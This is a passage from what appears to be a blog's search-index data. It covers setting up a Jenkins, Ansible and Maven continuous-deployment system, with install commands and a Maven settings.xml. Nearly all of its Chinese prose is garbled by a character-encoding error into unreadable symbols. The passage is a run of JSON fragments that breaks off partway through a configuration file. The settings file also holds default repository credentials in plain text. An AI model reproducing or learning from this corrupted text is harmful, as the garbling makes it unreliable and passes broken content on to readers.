æˆ‘ä»¬çš„æŸä¸ªåº”ç”¨ç›´æ¥æ„å»ºæˆrpmï¼Œæ˜¯ç›´æ¥æ”¾åˆ°æˆ‘ä»¬å¦ä¸€ä¸ªå†…éƒ¨æœåŠ¡å™¨ä¸­ï¼Œæä¾›httpæ¥å£ï¼Œç„¶åæ‰§è¡Œçš„å°±æ˜¯yumæ¨¡å—è¿›è¡Œå®‰è£…ã€‚ ä¹Ÿæœ‰äººé—®æˆ‘saltæœ‰æ²¡æœ‰ç”¨è¿‡ã€‚å…¶å®æˆ‘ä»¬æœ€åˆæ˜¯ä½¿ç”¨saltçš„ï¼Œåæ¥å› ä¸ºç½‘ç»œçš„åŸå› ï¼Œé€‰æ‹©äº†æ²¡æœ‰agentçš„ansibleã€‚åœ¨é˜¿é‡Œäº‘ä¸Šé¢è¿˜æ˜¯saltå»æœåŠ¡ç®¡ç†ã€‚ å‚è€ƒå®˜ç½‘å…¥é—¨å­¦ä¹ è§†é¢‘","link":"/2016/03/07/è‡ªåŠ¨åŒ–+Jenkins/Ansible/ Ansible å­¦ä¹ å…¥é—¨ /"},{"title":"è®²å¦‚ä½•ç»“åˆjenkins+ ansibleæ„å»ºå‘å¸ƒç³»ç»Ÿ","text":"jenkins+ansibleï¼Œæ‰“é€ ä¸€ä¸ªwebæ„å»ºå‘å¸ƒç³»ç»Ÿè‡ªåŠ¨åŒ–è¿™å—æˆ‘ä»¬æµ‹è¯•ç”Ÿäº§ç¯å¢ƒå·²ç»ç”¨èµ·æ¥äº†ã€‚ è¿™ç¯‡æ–‡ç« ä¸»è¦è®²æˆ‘ä»¬å¦‚ä½•å®ç°æ•´ä¸ªwebå‘å¸ƒç³»ç»Ÿï¼Œå¦‚ä½•å®‰è£…é…ç½®çœ‹æˆ‘blogä¸Šé¢æœ‰ã€‚ éœ€è¦äº†è§£å‡ æ¬¾è‡ªåŠ¨åŒ–å·¥å…·ï¼š SaltStack,Ansible,Puppet,jenkins æ‰€ä»¥æˆ‘ä»¬ç¬¬1æ­¥åšçš„å°±æ˜¯ï¼šç”¨Ansible + Jenkinsæå®šè‡ªåŠ¨å‘å¸ƒã€‚Ansibleæ˜¯ç›¸å¯¹ç®€å•çš„æ‰¹é‡ç®¡ç†å·¥å…·ï¼Œæ”¯æŒæ¨¡æ¿ç®¡ç†ç­‰é«˜çº§åŠŸèƒ½ã€‚æå®šäº†è‡ªåŠ¨å‘å¸ƒï¼Œå¼€å‘çš„æœåŠ¡å™¨éœ€æ±‚å·²ç»æ˜æ˜¾ä¸‹é™ï¼Œåªè¦æŠŠä»£ç æäº¤åˆ° Gitä¸»å¹²ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘å‘å¸ƒã€‚ Gitä½¿ç”¨çš„æ˜¯ GitLabï¼ŒåæœŸåŒæ—¶ä¸ºäº†å®‰å…¨æˆ‘ä»¬åšäº†ä¸€å±‚LDAPä»£ç†ï¼Œæ•ˆæœç›¸å½“äºâ€œå°†å†›ä»¤â€ï¼Œæ“ä½œæœºã€Gitå’ŒJenkinsç”¨ OpenLDAP åšç»Ÿä¸€è®¤è¯ï¼Œåç»­ç”¨åˆ°çš„Redmineã€Grafanaã€Zabbixç­‰éƒ½æ¥å…¥äº†OpenLDAPè®¤è¯ï¼Œæ¯ä¸ªäººéƒ½æœ‰ä¸ªåŠ¨æ€å£ä»¤ï¼Œæ¯æ¬¡éªŒè¯éƒ½éœ€è¦ç”¨åˆ°ã€‚ æµç¨‹ç»“æ„ ç®€å•ç»˜åˆ¶äº†ä¸‹Jenkinsçš„ä¸€ä¸ªæµç¨‹ï¼Œå¦‚ä¸‹å›¾ï¼š æ‹“æ‰‘å›¾ 1234567891011121314151617181920212223 &gt; è¯¥å¹³å°ä»¥jenkins ä¸ºä¸­å¿ƒï¼Œç„¶åå›´ç»•ä»–è¿›è¡Œæ‰©å±•ã€‚ &gt; ä»£ç å…¨å±€é…ç½®é€šè¿‡â€æ–‡ä»¶ç®¡ç†å¹³å°â€ è¿›è¡Œç®¡ç†ã€‚æ¯æ¬¡ä»£ç è¿›è¡Œbuildæ—¶ï¼Œpullä¸€ä¸‹é…ç½®ã€‚ä½¿é…ç½®ä¸ºæœ€æ–°çš„ã€‚ &gt; å¼€å‘äººå‘˜å°†ä»£ç pushåˆ°gitlabï¼Œå¼€å‘è€…ä¹‹é—´ç›¸äº’reviewä»£ç ã€‚ç„¶åmurgeåˆ°masteråˆ†æ”¯ã€‚jenkinsä¸Šçš„pullä»£ç åˆ°workspaceç©ºé—´ã€‚ &gt; å®‰è£…ä¸€äº›ä¾èµ–çš„ç¬¬ä¸‰æ–¹åŒ…ã€‚ &gt; ä»£ç å’Œé…ç½®æ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œé€šè¿‡rediså­˜å‚¨çš„ç‰ˆæœ¬ä¿¡æ¯åˆ›å»ºç‰ˆæœ¬ã€‚ &gt; æŠŠå°†è¦å‘å¸ƒçš„ç‰ˆæœ¬æ¨é€åˆ°è¿œç«¯æœºå™¨ï¼ŒreloadæœåŠ¡å®ç°ä¸Šçº¿ã€‚ &gt; å½“å‘å¸ƒçš„ä»£ç å‡ºç°é—®é¢˜ï¼Œå›æ»šæŒ‡å®šç‰ˆæœ¬(é»˜è®¤å›æ»šä¸Šä¸€ç‰ˆæœ¬)ï¼Œæœ€å¤šå¯å›æ»šä¹‹å‰5ä¸ªç‰ˆæœ¬ã€‚``` ansibleæ˜¯æ–°å‡ºç°çš„è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ï¼ŒåŸºäºPythonå¼€å‘ï¼Œé›†åˆäº†ä¼—å¤šè¿ç»´å·¥å…·ï¼ˆpuppetã€cfengineã€chefã€funcã€fabricï¼‰çš„ä¼˜ç‚¹ï¼Œå®ç°äº†æ‰¹é‡ç³»ç»Ÿé…ç½®ã€æ‰¹é‡ç¨‹åºéƒ¨ç½²ã€æ‰¹é‡è¿è¡Œå‘½ä»¤ç­‰åŠŸèƒ½ã€‚ansibleæ˜¯åŸºäºæ¨¡å—å·¥ä½œçš„ï¼Œæœ¬èº«æ²¡æœ‰æ‰¹é‡éƒ¨ç½²çš„èƒ½åŠ›ã€‚çœŸæ­£å…·æœ‰æ‰¹é‡éƒ¨ç½²çš„æ˜¯ansibleæ‰€è¿è¡Œçš„æ¨¡å—ï¼Œansibleåªæ˜¯æä¾›ä¸€ç§æ¡†æ¶ã€‚ä¸»è¦åŒ…æ‹¬ï¼š```bash(1)ã€è¿æ¥æ’ä»¶connection pluginsï¼šè´Ÿè´£å’Œè¢«ç›‘æ§ç«¯å®ç°é€šä¿¡ï¼›(2)ã€host inventoryï¼šæŒ‡å®šæ“ä½œçš„ä¸»æœºï¼Œæ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢å®šä¹‰ç›‘æ§çš„ä¸»æœºï¼›(3)ã€å„ç§æ¨¡å—æ ¸å¿ƒæ¨¡å—ã€commandæ¨¡å—ã€è‡ªå®šä¹‰æ¨¡å—ï¼›(4)ã€å€ŸåŠ©äºæ’ä»¶å®Œæˆè®°å½•æ—¥å¿—é‚®ä»¶ç­‰åŠŸèƒ½ï¼›(5)ã€playbookï¼šå‰§æœ¬æ‰§è¡Œå¤šä¸ªä»»åŠ¡æ—¶ï¼Œéå¿…éœ€å¯ä»¥è®©èŠ‚ç‚¹ä¸€æ¬¡æ€§è¿è¡Œå¤šä¸ªä»»åŠ¡ã€‚ è¿™é‡Œä¹‹å‰ç”¨Jenkinsä½¿ç”¨èµ·æ¥ã€‚é‡åˆ°ä¸ªéš¾é¢˜è¿™é‡Œåˆ†æå“ªå‡ ç‚¹ï¼š 1234567githubä½œä¸ºæºä»£ç ä»“åº“ jenkinsåšä¸ºæ‰“åŒ…æœåŠ¡å™¨ï¼ŒWebæ§åˆ¶æœåŠ¡å™¨åœ¨jenkinsçš„ç³»ç»Ÿé…ç½®é‡Œï¼Œå¯ä»¥æ‰¾åˆ°mavenï¼Œgitï¼ŒJavaç›¸å…³çš„é…ç½®ï¼Œåªè¦å‹¾é€‰äº†ï¼Œåœ¨å¼€æ—¶æ‰§è¡Œjobæ—¶ï¼Œä¼šè‡ªåŠ¨ä¸‹è½½ã€‚ansibleæŠŠwaråŒ…ï¼Œå‘å¸ƒåˆ°è¿œç¨‹æœºå™¨tomcatæ¯å°æœåŠ¡å™¨ç¯å¢ƒéƒ½éœ€è¦åœ¨ansible /etc/ansible/hostsé…ç½®å¥½ï¼Œè¿™æ ·å¯ä»¥è®©å®ƒè‡ªåŠ¨åŒ–ä¸‹å‘åˆ°å¯¹åº”æœºå™¨ã€‚æŠŠjenkinsç”Ÿæˆçš„waråŒ…å‘å¸ƒåˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚è¿›å…¥è¯¥é¡¹ç›®çš„workspaceç›®å½•ä¸‹ä¿å­˜è¯¥playbookçš„ä»“åº“å­ç›®å½•ä¸‹, æ£€æŸ¥ansibleç‰ˆæœ¬, å¹¶æ‰§è¡Œæœ€ç»ˆçš„éƒ¨ç½²å‘½ä»¤.ä¼šä¸ä¼šå‘å¸ƒå‡ºç°ä¹±ç ã€‚ ç›‘æ§ï¼š ç”±äºåŸå§‹çš„ç›‘æ§ä¸æ»¡è¶³å¿«é€Ÿå¢é•¿çš„ä¸šåŠ¡ï¼Œæˆ‘è¿™è¾¹éƒ¨ç½²äº†å¼€æºç›‘æ§ç³»ç»Ÿ Zabbixï¼Œè™½ç„¶è¿ç»´èƒ½å¤Ÿå¾ˆå¥½çš„ä½¿ç”¨Zabbixï¼Œä½†å…¶ä»–éƒ¨é—¨åŒäº‹æ€»è§‰å¾—æ˜“ç”¨æ€§ä¸é«˜ã€è€Œä¸”å¾ˆå¤šå®šåˆ¶åŒ–ç›‘æ§å®ç°èµ·æ¥å¾ˆéº»çƒ¦ã€‚è¿˜æ˜¯éœ€è¦æœ‰è¿ç»´å¼€å‘åŒäº‹å¸®å¿™è¾…åŠ©ä¼šæ›´å¥½ã€‚","link":"/2016/10/29/è‡ªåŠ¨åŒ–+Jenkins/Jenkins/è®²å¦‚ä½•ç»“åˆjenkins+ ansibleæ„å»ºå‘å¸ƒç³»ç»Ÿ/"},{"title":"Ansible + Jenkins+Mavenï¼‹Nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°","text":"Ansible+Jenkinsæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°Ansibleæ˜¯ç›¸å¯¹ç®€å•çš„æ‰¹é‡ç®¡ç†å·¥å…·ï¼Œæ”¯æŒæ¨¡æ¿ç®¡ç†ç­‰é«˜çº§åŠŸèƒ½ã€‚æå®šäº†è‡ªåŠ¨å‘å¸ƒï¼Œå¼€å‘çš„æœåŠ¡å™¨éœ€æ±‚å·²ç»æ˜æ˜¾ä¸‹é™ï¼Œåªè¦æŠŠä»£ç æäº¤åˆ° Gitä¸»å¹²ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘å‘å¸ƒã€‚ ä»Šå¤©æœ‰ç©ºå°±ç®€å•è®°å½•ä¸‹ç”¨Ansible + Jenkinsæå®šè‡ªåŠ¨å‘å¸ƒ ã€‚è¿™ç¯‡æ˜¯ä¸»è¦ç¯å¢ƒå®‰è£…ã€‚ ä¸€ã€ä»€ä¹ˆæ˜¯æŒç»­é›†æˆ1ã€ä»€ä¹ˆæ˜¯é›†æˆ æŒ‡çš„æ˜¯ä»£ç ç”±ç¼–è¯‘ã€å‘å¸ƒå’Œæµ‹è¯•ã€ç›´åˆ°ä¸Šçº¿çš„ä¸€ä¸ªè¿‡ç¨‹ 2ã€ä»€ä¹ˆæŒç»­é›†æˆ é«˜æ•ˆçš„ã€æŒç»­æ€§è´¨çš„ä¸æ–­è¿­ä»£ä»£ç çš„é›†æˆå·¥ä½œ 3ã€å¦‚ä½•é«˜æ•ˆå‡†ç¡®çš„å®ç°æŒç»­é›†æˆ å¿…ä¸å¯å°‘çš„éœ€è¦ä¸€å¥—èƒ½è‡ªåŠ¨åŒ–ã€å¹¶ä¸”å¯è§†åŒ–çš„å¹³å°æ¥å¸®åŠ©æˆ‘ä»¬ã€‚ é‚£ä¹ˆæ€»ç»“æ¥çœ‹ï¼ŒJenkinså°±æ˜¯ä¸€ä¸ªå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°æŒç»­é›†æˆçš„å¹³å°ã€‚ äºŒã€ä¸ºä»€ä¹ˆJenkinsèƒ½å¸®åŠ©æˆ‘ä»¬è¿›è¡ŒæŒç»­é›†æˆ ç†ç”±æœ‰å¦‚ä¸‹å‡ ç‚¹ï¼š 1ã€Jenkinsæ˜¯ä¸€ä¸ªå¼€æºçš„ã€ä¸”åŸºäºJAVAä»£ç å¼€å‘çš„æŒç»­é›†æˆç³»ç»Ÿã€‚ å› ä¸ºå«æœ‰éå¸¸ä¸°å¯Œçš„æ’ä»¶æ”¯æŒæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„æ‰“é€šç‰ˆæœ¬åº“ã€æµ‹è¯•æ„å»ºç¯å¢ƒã€çº¿ä¸Šç¯å¢ƒçš„æ‰€æœ‰ç¯èŠ‚ã€‚å¹¶ä¸”ä¸°å¯Œå‹å¥½çš„é€šçŸ¥ä½¿ç”¨è€…å’Œå¼€å‘ã€ç®¡ç†äººå‘˜ã€‚ 2ã€å®‰è£…ç»´æŠ¤ç®€å• å®‰è£…Jenkinsï¼Œä¸å¤ªå¤æ‚ã€‚ä¸”æ”¯æŒé€šç”¨çš„å¹³å°ã€‚ 3ã€Java åº”ç”¨ å¸¸ç”¨ åœ¨ä¼ä¸šçš„è½¯ä»¶æ„å»ºè¿‡ç¨‹ä¸­ï¼ŒJAVAçš„åº”ç”¨å·¥ç¨‹ç¨æ˜¾å¤æ‚ï¼Œç”±äºå¤æ‚æ„å»ºã€å’Œä»£ç ä¸Šçº¿ã€å¹¶ä¸”æœåŠ¡çš„é‡å¯ã€‚æ•´ä¸ªè¿‡ç¨‹ä¸‹æ¥ï¼Œæ¶ˆè€—çš„æ—¶é—´è¾ƒå¤šï¼ŒJenkinså´èƒ½å¾ˆå¥½çš„é›†æˆmavençš„ç¼–è¯‘æ–¹å¼ï¼Œä¸”åˆ©ç”¨è‡ªåŠ¨åŒ–çš„æ’ä»¶ã€å’Œè‡ªå®šä¹‰å¼€å‘è„šæœ¬çš„æ”¯æŒã€‚æ‰€ä»¥ç›®å‰å¹¿æ³›çš„åº”ç”¨äºJAVAå·¥ç¨‹çš„æŒç»­é›†æˆå¹³å°ã€‚ å¥½äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘å°±æ¥ä»‹ç»ï¼Œå¦‚ä½•æ­å»ºä¸€å¥—å¿«é€Ÿæœ‰æ•ˆçš„Jenkinsè‡ªåŠ¨åŒ–å‘å¸ƒæŒç»­é›†æˆå¹³å°ã€‚ å‰è¨€ä¸ºäº†æé«˜å·¥ä½œæ•ˆç‡ï¼Œé¿å…é‡å¤çš„æ‰‹åŠ¨å‘åŒ…éƒ¨ç½²å·¥ä½œï¼Œç‰¹æ­å»ºJenkins+Ansibleçš„è‡ªåŠ¨éƒ¨ç½²å¹³å°ã€‚ä¸»è¦å®ç°åŸç†æ˜¯ï¼š ç”±Jenkinsæ‹‰å–gitä»£ç  ä½¿ç”¨Mavenå‘½ä»¤ç¼–è¯‘æ‰“åŒ… é€šè¿‡Ansible å‘é€waråŒ…åˆ°å¯¹åº”çš„æœåŠ¡å™¨ é€šè¿‡Ansibleæ‰§è¡Œè¿œç¨‹æœåŠ¡å™¨çš„é‡å¯å‘½ä»¤ å‘å¸ƒå®Œæˆã€‚ ä¸€. ç¯å¢ƒä»‹ç»æœ¬å¹³å°æ­å»ºåœ¨CentOS6ç¯å¢ƒä¸­ï¼Œå…¶ä»–linuxç¯å¢ƒæƒ…å†µç±»ä¼¼ã€‚åœ¨è‡ªåŠ¨éƒ¨ç½²æœåŠ¡å™¨ä¸­éœ€è¦å®‰è£…ä»¥ä¸‹è½¯ä»¶ï¼š JDK Git Maven Tomcat Jenkins Ansible äºŒ. æ­¥éª¤ï¼š ansibleå®‰è£…ä¸é…ç½®ï¼› Jenkinsçš„å®‰è£…ï¼› Jenkinsçš„é…ç½®ï¼› å®‰è£…é…ç½®tomcat å®‰è£…é…ç½®Javaï¼› å®‰è£…é…ç½®mavenï¼› nginxåå‘ä»£ç†é…ç½®è®¿é—®åŸŸåï¼› ç›¸å…³æ’ä»¶å®‰è£…ï¼› ç³»ç»Ÿè®¾ç½®æ˜ç»†ï¼› slaveèŠ‚ç‚¹é…ç½®ï¼› ä¸€äº›ä¾èµ–é¡¹çš„å®‰è£…ã€‚ 1.1 Ansibleç®€å•ä»‹ç»Ansibleæ˜¯ä¸€ä¸ªéƒ¨ç½²ä¸€ç¾¤è¿œç¨‹ä¸»æœºçš„å·¥å…·ã€‚è¿œç¨‹çš„ä¸»æœºå¯ä»¥æ˜¯æœ¬åœ°æˆ–è€…è¿œç¨‹çš„è™šæ‹Ÿ æœºï¼Œä¹Ÿå¯ä»¥æ˜¯è¿œç¨‹çš„ç‰©ç†æœºã€‚Ansibleé€šè¿‡SSHåè®®è¿›è¡Œç®¡ç†èŠ‚ç‚¹å’Œè¿œç¨‹èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ã€‚ç†è®ºä¸Šè¯´ç®¡ç†å‘˜é€šè¿‡ sshåˆ°ä¸€å°è¿œç¨‹ä¸»æœºä¸Šèƒ½åšçš„æ“ä½œAnsibleéƒ½å¯ä»¥åšã€‚åŒ…æ‹¬ï¼šæ‹·è´æ–‡ä»¶ã€å®‰è£…åŒ…ã€å¯åŠ¨æœåŠ¡â€¦ æ€»ç»“ï¼šAnsibleæŠŠä¸€äº›shellå‘½ä»¤å°è£…æˆä¸€ä¸ªä¸ªæ¨¡å—ï¼Œå¹¶é€šè¿‡SSHè¿æ¥ï¼Œåœ¨è¿œç¨‹æœºå™¨ä¸Šæ‰§è¡Œè¿™äº›æ¨¡å—åŒ…å«çš„è„šæœ¬ã€‚ 1.2 Ansibleå®‰è£…ä¸é…ç½®ç³»ç»Ÿç¯å¢ƒï¼šcentos7.1ç›´æ¥ä½¿ç”¨yumå®‰è£…ansible 12# yum install http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm# yum install ansible å®‰è£…å®Œæˆä¹‹åï¼Œéœ€è¦ansibleä¸­çš„hostsæ–‡ä»¶åˆ†ç»„ï¼Œç¼–è¾‘/etc/ansible/hostsæ–‡ä»¶ï¼Œå°†ç›®æ ‡æœºå™¨åŠ å…¥åˆ†ç»„ï¼Œå¹¶é…ç½®å¥½é¢ç§˜é’¥ç™»å½•ã€‚Ansibleæ›´å¤šè¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„ansibleså­¦ä¹ ç¯‡ äºŒ. å®‰è£…Jenkinsç¯å¢ƒ1) å®‰è£…å¹¶é…ç½®å¥½JAVAã€JDKã€Tomcatï¼Œå¹¶å»å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„waråŒ…ã€‚ å»å®˜ç½‘ä¸‹è½½åŒ…èµ„æºï¼š 1234apache-tomcat-8.0.28.tar.gzjenkins.warjdk1.8.0_66.tar.gzmaven.tar.gz æ²¡æœ‰ä¸‹è½½æˆåŠŸçš„æˆ‘è¿™é‡Œå·²ä¸‹è½½å¥½äº†ã€‚æœ€æ–°ç‰ˆæœ¬jenkins.wartomcat.tar.gzmaven.tar.gz 2.1 jdkå®‰è£…ï¼š12345678910111213tar -zxvf jdk1.8.0_66.tar.gz -C /srv/. è¿™é‡Œåœ¨é…ç½®ç¯å¢ƒå˜é‡ã€‚vim /etc/profile.d/java.shexport JAVA_HOME=/srv/jdk1.8.0_66export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin[root@Jenkins ~]# java -versionjava version \"1.8.0_66\"Java(TM) SE Runtime Environment (build 1.8.0_66-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.66-b17, mixed mode) 2.2 Tomcatå®‰è£…é…ç½®ï¼šJenkinså®˜ç½‘ï¼šhttps://jenkins.io/index.htmlå¯å‚è€ƒæˆ‘ä¹‹å‰å†™çš„æ–‡æ¡£ï¼šæ­å»ºé…ç½®tomcatç¯å¢ƒ 1234tar -zxvf apache-tomcat-8.0.28.tar.gz -C /srv/.mv apache-tomcat-8.0.28 tomcatuseradd -s /sbin/nologin tomcat chown -R tomcat:tomcat tomcat 2) æ”¾åœ¨é…ç½®å¥½Tomcatï¼Œå¯åŠ¨Jenkinsï¼Œæ ¹æ®æç¤ºï¼Œè¾“å…¥å®‰è£…ç§˜é’¥ã€‚ 2.3 jenkinså®‰è£…é…ç½®ï¼š12345mv jenkins.war /srv/tomcat/webapps/. cd /tomcat./bin/startup.shç„¶åæ‰“å¼€åœ°å€ï¼šhttp://192.168.1.183:8080/jenkinsæ–°ç‰ˆæœ¬ä¼šæç¤ºä¸‹è½½å®‰è£…æ’ä»¶ã€‚ä¸‹è½½ä»¥åä¼šè®©ä½ è®¾ç½®è´¦å·å’Œå¯†ç è¿˜æœ‰é‚®ç®±ã€‚ è¿›å…¥å®‰è£…ç•Œé¢:ç¬¬ä¸€æ¬¡ï¼Œç™»å½•ï¼Œéœ€è¦è¿›è¡Œä¸€ä¸ªè§£é” ï¼Œé¡µé¢ä¹Ÿä¼šæœ‰æç¤º. ç§˜é’¥çš„å…·ä½“ä½ç½®åœ¨ï¼š/root/.jenkins/secrets/initialAdminPasswordä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–‡ä»¶ä¸­æŸ¥çœ‹å¯†ç ï¼Œå¹¶è¾“å…¥ã€‚ 3) è®¾ç½®å¥½ç™»å½•è´¦å·å¯†ç ï¼Œæ ¹æ®æ¨èé€‰é¡¹å®‰è£…æ’ä»¶ï¼Œç­‰å¾…ä¸‹è½½å®‰è£…å®Œæˆã€‚åœ¨æ’ä»¶å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½æœ‰äº›å®‰è£…ä¸æˆåŠŸï¼Œæš‚æ—¶å…ˆä¸ç”¨ç®¡ã€‚ å®ƒä¼šç»™æˆ‘ä»¬å®‰è£…ä¸€äº›åŸºç¡€çš„æ’ä»¶æ—©æœŸjenkinsé»˜è®¤æ˜¯ä¸éœ€è¦ç™»é™†çš„ã€‚ 1.3 Maven å®‰è£…å’Œé…ç½®å®˜ç½‘ï¼šhttp://maven.apache.org/å®˜ç½‘ä¸‹è½½ï¼šhttp://maven.apache.org/download.cgiå†å²ç‰ˆæœ¬ä¸‹è½½ï¼šhttps://archive.apache.org/dist/maven/binaries/æ­¤æ—¶ï¼ˆ20160208ï¼‰ Maven æœ€æ–°ç‰ˆæœ¬ä¸ºï¼š3.3.9 Maven 3.3 çš„ JDK æœ€ä½è¦æ±‚æ˜¯ JDK 1.7 - æˆ‘ä¸ªäººä¹ æƒ¯ /opt ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›®å½• setups ç”¨æ¥å­˜æ”¾å„ç§è½¯ä»¶å®‰è£…åŒ…ï¼›åœ¨ /srv ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª program ç”¨æ¥å­˜æ”¾å„ç§è§£å‹åçš„è½¯ä»¶åŒ…ï¼Œä¸‹é¢çš„è®²è§£ä¹Ÿéƒ½æ˜¯åŸºäºæ­¤ä¹ æƒ¯. ä¸‹è½½å‹ç¼©åŒ…ï¼šwget http://mirrors.cnnic.cn/apache/maven/maven-3/3.3.9/binaries/apache-maven-3.3.9-bin.tar.gzè§£å‹æŒ‡å®šåˆ°æˆ‘ä¸ªäººä¹ æƒ¯çš„å®‰è£…ç›®å½•ä¸‹ï¼štar zxvf apache-maven-3.3.9-bin.tar.gz -C /srv/program/.ç§»åˆ°æˆ‘ä¸ªäººä¹ æƒ¯çš„å®‰è£…ç›®å½•ä¸‹ï¼šmv maven3.3.9/ /srv/program/maven3 12345678ç¯å¢ƒå˜é‡è®¾ç½®ï¼švim /etc/profile.d/maven.sh # Maven MAVEN_HOME=/srv/program/maven3 PATH=$PATH:$MAVEN_HOME/bin MAVEN_OPTS=\"-Xms256m -Xmx356m\" export MAVEN_HOME export PATH export MAVEN_OPTS åˆ·æ–°é…ç½®æ–‡ä»¶ï¼šsource /etc/profileæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼šmvn -version 1.3.1 Maven é…ç½® é…ç½®é¡¹ç›®è¿æ¥ä¸Šç§æœ å…¨å±€æ–¹å¼é…ç½®ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\"&gt; &lt;!--æœ¬åœ°ä»“åº“ä½ç½®--&gt; &lt;localRepository&gt;/srv/mv2&lt;/localRepository&gt; &lt;pluginGroups&gt; &lt;/pluginGroups&gt; &lt;proxies&gt; &lt;/proxies&gt; &lt;!--è®¾ç½® Nexus è®¤è¯ä¿¡æ¯--&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; &lt;!--è®¾ç½® Nexus é•œåƒï¼Œåé¢åªè¦æœ¬åœ°æ²¡å¯¹åº”çš„ä»¥æ¥ï¼Œåˆ™åˆ° Nexus å»æ‰¾--&gt; &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public-snapshots&lt;/url&gt; &lt;/mirror&gt; &lt;/mirrors&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;nexus&lt;/id&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;url&gt;http://nexus-releases&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;url&gt;http://nexus-snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;url&gt;http://nexus-releases&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;pluginRepository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;url&gt;http://nexus-snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;/profile&gt; &lt;/profiles&gt; &lt;activeProfiles&gt; &lt;activeProfile&gt;nexus&lt;/activeProfile&gt; &lt;/activeProfiles&gt;&lt;/settings&gt; jenkinså‘å¸ƒä¿®æ”¹è¿‡ä»¥åï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\"&gt; &lt;!--è¡¨ç¤ºæœ¬åœ°åº“çš„ä¿å­˜ä½ç½®ï¼Œä¹Ÿå°±æ˜¯maven2ä¸»è¦çš„jarä¿å­˜ä½ç½®ï¼Œé»˜è®¤åœ¨$&#123;user.dir&#125;/.m2/repositoryï¼Œå¦‚æœéœ€è¦å¦å¤–è®¾ç½®ï¼Œå°±æ¢æˆå…¶ä»–çš„è·¯å¾„ã€‚ --&gt; &lt;localRepository&gt;/srv/m2&lt;/localRepository&gt; &lt;interactiveMode/&gt; &lt;usePluginRegistry/&gt; &lt;offline&gt;false&lt;/offline&gt; 